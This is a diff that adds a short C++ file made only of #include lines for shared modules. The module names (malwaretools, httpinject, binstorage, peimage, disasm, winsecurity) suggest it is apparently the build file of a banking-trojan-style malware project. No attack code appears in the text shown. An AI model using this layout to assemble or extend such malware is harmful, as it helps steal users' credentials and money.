@@ -1,0 +1,27 @@
+#include "defines.h"
+
+#include "..\common\mem.cpp"
+#include "..\common\str.cpp"
+#include "..\common\time.cpp"
+#include "..\common\ucl.cpp"
+#include "..\common\crypt.cpp"
+#include "..\common\fs.cpp"
+#include "..\common\math.cpp"
+#include "..\common\config0.cpp"
+#include "..\common\sync.cpp"
+#include "..\common\registry.cpp"
+#include "..\common\gui.cpp"
+#include "..\common\process.cpp"
+#include "..\common\winsecurity.cpp"
+#include "..\common\peimage.cpp"
+#include "..\common\registry.h"
+#include "..\common\malwaretools.cpp"
+#include "..\common\disasm.cpp"
+#include "..\common\binstorage.cpp"
+#include "..\common\httpinject.cpp"
+#include "..\common\baseoverlay.cpp"
+#include "..\common\comlibrary.cpp"
+
+#if defined SUBSYSTEM_CONSOLE
+#  include "..\common\console.cpp"
+#endif
